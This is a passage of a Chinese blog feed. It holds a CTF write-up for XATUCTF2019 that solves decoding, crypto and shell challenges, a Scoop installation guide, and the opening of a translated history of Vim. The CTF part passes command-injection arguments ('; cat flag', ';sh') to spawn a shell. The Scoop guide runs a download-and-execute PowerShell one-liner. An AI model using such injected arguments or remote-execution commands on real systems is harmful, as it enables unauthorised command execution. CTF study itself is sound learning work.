</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">hex2bin</span>(<span style="color:#a6e22e">strrev</span>(<span style="color:#a6e22e">bin2hex</span>($flag)))), <span style="color:#e6db74">&#39;&lt;hr&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>可知加密为 <code>base64_encode(hex2bin(strrev(bin2hex($flag))))</code>，一层一层解密，python 脚本如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> binascii <span style="color:#f92672">import</span> hexlify, unhexlify
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(unhexlify(hexlify(b64decode(code))[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
</span></span></code></pre></div><h2 id="pwn">PWN</h2>
<h3 id="nc-from-0-to-1">nc from 0 to 1</h3>
<p>直接 nc 连接即可获得 flag</p>
<h3 id="ls1">ls1</h3>
<p>ls as a service，将输入的字符传递为 ls 的 args，多试几次即可得出文件目录结构，精简后的如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>├── bin
</span></span><span style="display:flex;"><span>│   ├── cat
</span></span><span style="display:flex;"><span>│   ├── ls
</span></span><span style="display:flex;"><span>│   └── sh
</span></span><span style="display:flex;"><span>├── flag
</span></span><span style="display:flex;"><span>└── ls1
</span></span></code></pre></div><p>传入 <code>; cat flag</code> 即可读到
<img src="https://s2.ax1x.com/2019/04/19/E92wlT.png" alt="ls1"></p>
<h3 id="ls2">ls2</h3>
<p>ls as a service v2，限制了传入 args 的字符数为 3，无法直接 <code>cat flag</code>。
由于 <code>bin</code> 下存在 <code>sh</code>，通过 <code>;sh</code> 唤起 shell，读取 flag。</p>
<p><img src="https://s2.ax1x.com/2019/04/19/E9206U.png" alt="ls2"></p>
<h2 id="crypto">CRYPTO</h2>
<h3 id="dididi">dididi</h3>
<p><code>..-. .-.. .- --. ..-. -.. ....- .---- . .---- ..--- -.. ----- ...-- .---- -.-. ..--- . -.. -.... -.-. ..-. ---.. ---.. ---.. -.... ...-- ---.. . -.... -.... -... . ....- -.. .</code></p>
<p>摩斯密码</p>
<h3 id="caesar-cipher">Caesar cipher</h3>
<p><code>kqfl{Hfjxfw_hnumjw_1x_xt_xnruqj}</code></p>
<p>凯撒加密</p>
<h3 id="rc4">rc4</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>cipher:wRTwnbjEAf6T22dYzyKgtBzQ/ydMmNqmf3WeW9E=
</span></span><span style="display:flex;"><span>key:eGF0dXNlYw==
</span></span></code></pre></div><p><a href="http://ctf.ssleye.com/rc4.html">rc4 加密</a>，唯一需要注意的是 key 可能需要经过一次 base64 解密。</p>
<h3 id="datababy">Datababy</h3>
<p>数码宝贝中的字母表，对照即可。</p>
<p>（由此题可以知道出题人没再手动复现题，因为 datababy 并不能搜到数码宝贝。其官方英文名称为 <em>Digital monster</em> 。</p>
<h3 id="baby-rsa">baby RSA</h3>
<p>与下面的 esayRSA 相同，用现成的库就好</p>
<h3 id="110">110</h3>
<p>ONE -&gt; 1
ZERO -&gt; 0
得到一长长长长长长长长长长长长长长长长长长长长长串 0 和 1。</p>
<p>每八位二进制转 ASCII 即可获得 flag。</p>
<h3 id="easy-rsa">easy RSA</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>n = 9637828843823500407917687664441327784714605952794831018467094508166140790258515855681653788687192363262499178812675284846293988948568322307302995971433129
</span></span><span style="display:flex;"><span>e = 65537
</span></span><span style="display:flex;"><span>c = 1736476276571471518318904802453151397043836796931780608028216447791913603812271065838523639504410549594365173220377575243217983329182149750696526310732151
</span></span></code></pre></div><p><a href="https://github.com/3summer/CTF-RSA-tool">https://github.com/3summer/CTF-RSA-tool</a></p>
<h2 id="misc">MISC</h2>
<h3 id="这个容易就是有点累">这个容易，就是有点累</h3>
<p>一个压缩了几千层的 zip 包，可以直接上十六进制查看器(winhex, hxd, 010 editor 等)打开，Ctrl + F flag 即可得到。</p>
<p>据写脚本解压的小伙伴称他们跑了一个多小时（</p>
<p>压缩脚本如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>name1<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat /dev/urandom | sed <span style="color:#e6db74">&#39;s/[^a-zA-Z0-9]//g&#39;</span> | strings -n <span style="color:#ae81ff">6</span> | head -n 1<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>name2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.zip&#34;</span>
</span></span><span style="display:flex;"><span>name<span style="color:#f92672">=</span>$name1$name2
</span></span><span style="display:flex;"><span><span style="color:#75715e">#echo $name</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>zip -m $name flag
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span> name1<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat /dev/urandom | sed <span style="color:#e6db74">&#39;s/[^a-zA-Z0-9]//g&#39;</span> | strings -n <span style="color:#ae81ff">6</span> | head -n 1<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span> name<span style="color:#f92672">=</span>$name1$name2
</span></span><span style="display:flex;"><span> zip -m $name *.zip
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><h3 id="fibs">Fibs</h3>
<p>求斐波那契数列第 1234 项，然后 md5(hex(Fibs(1234)))，（转小写后）即为 flag。</p>
<p>看到这个题……肯定不能自己现场写算法，否则会被跑炸内存的。直接谷歌斐波那契数列快速求第 N 项，得到 O(log N) 的算法后写脚本求项。</p>
<p>脚本如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Fibonacci_recursion_fast</span>(n):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    k <span style="color:#f92672">=</span> (n <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">if</span> n <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">else</span> n <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>    fib_k <span style="color:#f92672">=</span> Fibonacci_recursion_fast(k)
</span></span><span style="display:flex;"><span>    fib_k_1 <span style="color:#f92672">=</span> Fibonacci_recursion_fast(k <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> fib_k<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> fib_k_1<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">if</span> n <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">else</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> fib_k_1 <span style="color:#f92672">+</span> fib_k) <span style="color:#f92672">*</span> fib_k
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(hex(Fibonacci_recursion_fast(<span style="color:#ae81ff">1234</span>)))
</span></span></code></pre></div><p>md5 一下，再转小写提交。</p>
<h2 id="reverse">REVERSE</h2>
<h3 id="snake">Snake</h3>
<p>贪吃蛇，玩到 70 分就出 flag</p>
<h3 id="sstas-python-教室">ssta&rsquo;s Python 教室</h3>
<p>给的是一个 pyc 文件，在线反编译，得到的代码如下。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># encoding: utf-8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b32encode
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> codecs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">b32</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> b32encode(s)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rot13</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> codecs<span style="color:#f92672">.</span>encode(s, <span style="color:#e6db74">&#39;rot13&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># return s.encode(&#39;rot13&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reverse</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reverseSomeByte</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:] <span style="color:#f92672">+</span> s[:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;******************************&#39;</span>
</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> reverse(b32(rot13(reverseSomeByte(flag))))
</span></span><span style="display:flex;"><span>    print(cipher)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;=== WELCOME TO XATUCTF2019 ===&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    ffllaagg <span style="color:#f92672">=</span> main()
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;FLAG is right here. Can you get it?&#39;</span>, ffllaagg)
</span></span></code></pre></div><p>重点是 <code>cipher = reverse(b32(rot13(reverseSomeByte(flag))))</code>，与 phpencode 相似，自己写脚本一层一层解密即可。
自己写的不完善的脚本如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># -*- encoding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b32decode
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> codecs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">b32</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> b32decode(s)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rot13</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> codecs<span style="color:#f92672">.</span>decode(s, <span style="color:#e6db74">&#39;rot13&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reverse</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(rot13(b32(reverse(cipher))<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;ASCII&#34;</span>)))
</span></span></code></pre></div><p>前六位移到最后即可。</p>
<hr>
<p>自己没做出来的题就没写 wp 23333</p>
]]></content><category scheme="https://blog.batkiz.com/tags/ctf" term="ctf" label="ctf"/></entry><entry><title type="html">初探 Scoop</title><link href="https://blog.batkiz.com/posts/using-scoop/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/using-wsl/?utm_source=atom_feed" rel="related" type="text/html" title="wsl 使用指北"/><link href="https://blog.batkiz.com/posts/solving-cmder-space/?utm_source=atom_feed" rel="related" type="text/html" title="解决 cmder 光标问题"/><link href="https://blog.batkiz.com/posts/how-to-play-minecrafet-with-xbox-controller/?utm_source=atom_feed" rel="related" type="text/html" title="如何使用Xbox手柄玩Minecraft"/><link href="https://blog.batkiz.com/posts/software-on-my-computer/?utm_source=atom_feed" rel="related" type="text/html" title="我的电脑软件"/><id>https://blog.batkiz.com/posts/using-scoop/</id><published>2018-12-31T00:23:27+00:00</published><updated>2018-12-31T00:23:27+00:00</updated><content type="html"><![CDATA[<h2 id="缘起">缘起</h2>
<p>Linux 用的多了，不免会觉得有一个靠谱好用的包管理器是一件令人身心愉悦的事。许多人也便顺理成章地想要在 Windows 系统上来一个包管理器。</p>
<p>只是一方面微软已然在大力推介其 Microsoft Store，另一方面命令行形式的包管理器对于大多数人也是极为不友好的。如此这般，一个官方的包管理器自然无望。</p>
<p>好在开源社区里从来不缺人造轮子。于是我们现在有了两个选择：<a href="https://chocolatey.org">Chocolatey</a> 与 <a href="https://scoop.sh">Scoop</a>，一个 <em>package manager</em> ，一个 <em>command-line installer</em> 。</p>
<p>既然本文标题为 scoop，那么显然 choco 已不是我们主要要讨论的了，至于最初我为什么选择了 scoop 而非 Choco，原因早已不记得了。或许是因为 choco 分为开源版与商业版，抑或是我尚未真正想要使用 Windows 上的“包管理器”来管理我的所有软件——虽然我不必与各种流氓软件斗智斗勇，但我还是非常享受各种软件的安装过程中的自定义，<code>Add to PATH</code>, <code>添加到右键菜单</code>。当然，最主要的原因还是 Windows 并没有一个统一的命令行形式的安装软件接口，因此对于普通的软件，还是要无止境地 next——这又和不用包管理器又有什么区别呢？</p>
<p>让我们把视线转到 Linux 平台，apt 等包管理器自动进行了软件的依赖分析与解压、配置的过程。Windows 系统之上与之理念相似的便是所谓“绿色软件”——解压即可使用。这也正是 scoop 所做的，利用所写的 mainfest，将解压、配置环境变量等自动化处理。另一方面，Windows 之上大多数软件并无所谓依赖的东西，最多便是一个 VC runtime，这也使得 scoop 的工作量更少了。</p>
<h2 id="使用">使用</h2>
<p>Scoop 默认是安装在你的用户文件夹下的，这样自然有着许多好处，例如不需要管理员权限。但如果你想要将其改变，可以在安装之前更改掉 scoop path</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">environment</span>]::setEnvironmentVariable(<span style="color:#e6db74">&#39;SCOOP&#39;</span>,<span style="color:#e6db74">&#39;C:\soft\Scoop&#39;</span>,<span style="color:#e6db74">&#39;User&#39;</span>)
</span></span><span style="display:flex;"><span>$env:SCOOP=<span style="color:#e6db74">&#39;C:\soft\Scoop&#39;</span>
</span></span></code></pre></div><p>其中的 <code>C:\soft\Scoop</code> 自然可以换成你想要的路径。
而后便是执行官网之上的那一行命令</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>iex (new-object net.webclient).downloadstring(<span style="color:#e6db74">&#39;https://get.scoop.sh&#39;</span>)
</span></span></code></pre></div><p>——若是报错，便将 execution policy 更改一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-ExecutionPolicy RemoteSigned -scope CurrentUser
</span></span></code></pre></div><p>而后再添加上 extras, versions 之类的 bucket，便可愉快的使用了。</p>
<p>个人推荐先</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">scoop</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">sudo</span> <span style="color:#a6e22e">7zip</span> <span style="color:#a6e22e">aria2</span>
</span></span></code></pre></div><p>来获得更好的体验。</p>
<p>其后的使用无非便是 <code>scoop help</code> 中所列举的东西了</p>
<h2 id="mainfest">mainfest</h2>
<p>经过一段时间的使用后，你可能会想要将自己在用的许多软件迁移到 scoop 中，但问题也随之而来。</p>
<p>Scoop 的用户群体并不算是很大，因此许多软件并不会官方提供 <code>scoop install</code> 这样的安装方式。</p>
<p>放弃自然也是不行的，那么不如自己动手丰衣足食，来自己写一个 mainfest 吧！</p>
<p>Scoop 的 mainfest 是一个 json 文件，好处很明显，这样一来其应用描述非常简洁。但坏处也肯定是有的，比如说，不支持注释。好在还有着官方的文档供我们查阅。</p>
<p>下面是一份我写的 mainfest，附上注释，希望能给人点方便。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;homepage&#34;</span>: <span style="color:#e6db74">&#34;https://oldj.github.io/SwitchHosts/&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 此处为软件主页
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;3.3.12.5349&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 版本号
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&#34;license&#34;</span>: <span style="color:#e6db74">&#34;MIT&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 软件所使用的协议
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;SwitchHosts! is an App for hosts management &amp; switching.&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 对软件的描述信息
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&#34;architecture&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 对于分架构进行分发的软件，可以以 architecture 对其区分，如果并不分架构，可直接 url &amp; hash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">&#34;64bit&#34;</span>: {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/oldj/SwitchHosts/releases/download/v3.3.12/SwitchHosts-win32-x64_v3.3.12.5349.zip&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 软件包下载链接
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#f92672">&#34;hash&#34;</span>: <span style="color:#e6db74">&#34;037fbc3b7bba4c9f43e105f00f68733397c1b3099e52eb57308a6659482d3fd0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 文件的 hash 值，可通过 Get-FileHash/sha256sum 来获得
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#f92672">&#34;extract_dir&#34;</span>: <span style="color:#e6db74">&#34;SwitchHosts!-win32-x64&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 解压的文件夹，指程序压缩包内的文件夹
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;32bit&#34;</span>: {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/oldj/SwitchHosts/releases/download/v3.3.12/SwitchHosts-win32-ia32_v3.3.12.5349.zip&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;hash&#34;</span>: <span style="color:#e6db74">&#34;41e7a2a0cf8261a3fcccfce4cd8d8efc893f3f472dcccd8c3e76623e19f5cf5d&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;extract_dir&#34;</span>: <span style="color:#e6db74">&#34;SwitchHosts!-win32-ia32&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;bin&#34;</span>: <span style="color:#e6db74">&#34;SwitchHosts!.exe&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 可执行文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&#34;shortcuts&#34;</span>: [[<span style="color:#e6db74">&#34;SwitchHosts!.exe&#34;</span>, <span style="color:#e6db74">&#34;SwitchHosts!&#34;</span>]],
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 此处为将其快捷方式加入开始菜单的配置
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&#34;checkver&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/oldj/SwitchHosts/releases&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;re&#34;</span>: <span style="color:#e6db74">&#34;SwitchHosts-win32-x64_v([\\d.]+).zip&#34;</span>
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 自动检查更新所用，不过我这里好像是有点小问题的
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&#34;autoupdate&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;architecture&#34;</span>: {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;64bit&#34;</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/oldj/SwitchHosts/releases/download/v$majorVersion.$minorVersion.$patchVersion/SwitchHosts-win32-x64_v$version.zip&#34;</span>
</span></span><span style="display:flex;"><span>      },
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;32bit&#34;</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/oldj/SwitchHosts/releases/download/v$majorVersion.$minorVersion.$patchVersion/SwitchHosts-win32-ia32_v$version.zip&#34;</span>
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>上面的这份已被收入 <a href="https://github.com/lukesampson/scoop-extras/pull/1519">extras bucket</a> 中，不过上面的<a href="https://github.com/lukesampson/scoop-extras/pull/1519#issuecomment-447215864">检查更新的配置貌似还有点小问题</a>。</p>
]]></content><category scheme="https://blog.batkiz.com/tags/windows" term="windows" label="windows"/></entry><entry><title type="html">翻译 | Vim 的诞生</title><link href="https://blog.batkiz.com/posts/where-vim-came-from/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/using-wsl/?utm_source=atom_feed" rel="related" type="text/html" title="wsl 使用指北"/><link href="https://blog.batkiz.com/posts/install-linux-in-upan/?utm_source=atom_feed" rel="related" type="text/html" title="将linux装入u盘之路"/><id>https://blog.batkiz.com/posts/where-vim-came-from/</id><published>2018-10-23T12:55:18+00:00</published><updated>2018-10-23T12:55:18+00:00</updated><content type="html"><![CDATA[<blockquote>Vim 这奇怪的键位到底从何而来？</blockquote><p>2025.7.5 补：<a href="/posts/ai-translation-the-rise-and-demise-of-rss/">借助 AI 能力翻译的新版本</a></p>
<p>原文：<a href="https://twobithistory.org/2018/08/05/where-vim-came-from.html">Where Vim Came From</a></p>
<p>另投稿于 <a href="http://jandan.net/2018/10/22/vim.html">煎蛋</a></p>
<blockquote>
<p>translated by <a href="https://batkiz.github.io/">batkiz</a> &amp; <a href="https://ruinsyi.github.io">RUInsYi</a> @ <a href="https://github.com/par-tuner">Par-Tuner</a></p>
</blockquote>
<p>我最近偶然发现了一个名为 Intel HEX 的文件格式。据我所了解，Intel HEX 文件（使用 <code>.hex</code> 扩展名），将二值图像编码为一行一行的十六进制数字，为了使它们更透明。显然它们被应用于单片机编程或将数据烧录进 ROM。无论如何，当我第一次在 Vim 中打开一个 HEX 文件时，我发现了一些令人震惊的事。这个文件格式——至少对我来说——非常难懂，但 Vim 已经知道了有关它的一切。HEX 文件的每一行都是一个被分为不同字段的记录——Vim 已经先我一步为每一字段着了色。我敬畏地问道，<code>set ft?</code>。<code>filetype=hex</code>，Vim 得意洋洋地回答。</p>
<p>Vim 无处不在。它被无数人使用，因此对 HEX 文件的支持并不令人意外。Vim 在 Mac OS 上被预装，且在 Linux 世界有着大批拥趸。甚至讨厌它的人也对其非常熟悉，大多数命令行工具会默认将用户扔向 Vim，以至于被困在 Vim 中的新手已经成为了<a href="https://stackoverflow.blog/wp-content/uploads/2017/05/meme.jpeg">一个梗</a>。很多的网站，包括 Facebook，会在你按 <code>j</code> 键时向下滚动，按 <code>k</code> 键时向上——Vim 在数字文化中奇迹般以高水准传播。</p>
<p>然而 Vim 还是一个谜。不像 React，每个人都知道它被 Facebook 开发与维护，Vim 并没有明显的赞助者。尽管它极为普遍和重要，仍没有任何形式的委员会或组织机构为 Vim 的事宜做决定。你可以花费几分钟在 <a href="https://www.vim.org/">Vim 官网</a> 上闲逛，却不会在谁创造了 Vim 或者为什么创造了 vim 上得到更好的结果。如果你径直打开 Vim，不加任何文件参数，你就会看到 Vim 的启动信息，称 Vim 被“Bram Moolenaar 等人”开发。但这也仅止于此。谁是 Bram Moolenaar，谁又是他暗中的合作伙伴？</p>
<p>可能更重要的是，当我们在问问题时，为什么退出 Vim 需要键入 <code>:wq</code>？当然，这是一个“写入”操作，其后是“退出”操作，但这并不是一个特别直观的约定。又是谁决定复制文本应被称为“yanking”？（译注：在 Emacs 中，&ldquo;yanking&rdquo; 代表的是粘贴（或者说，重新插入刚才删掉的内容），而并不是复制。）为什么 <code>:%s/foo/bar/gc</code> 是“查找并替换”的简称？Vim 的特质看起来太武断了，但它们又从何而来呢？</p>
<p>答案是，事实通常如此，这些开始于初始之计算机的火炉，贝尔实验室。某种意义上，Vim 仅仅是一个软件作品——被称为“wq 文本编辑器”——最新的迭代。这个软件自 Unix 纪元的黎明开始就不断地被开发和改进。</p>
<h2 id="ken-thompson-与一个行编辑器">Ken Thompson 与一个行编辑器</h2>
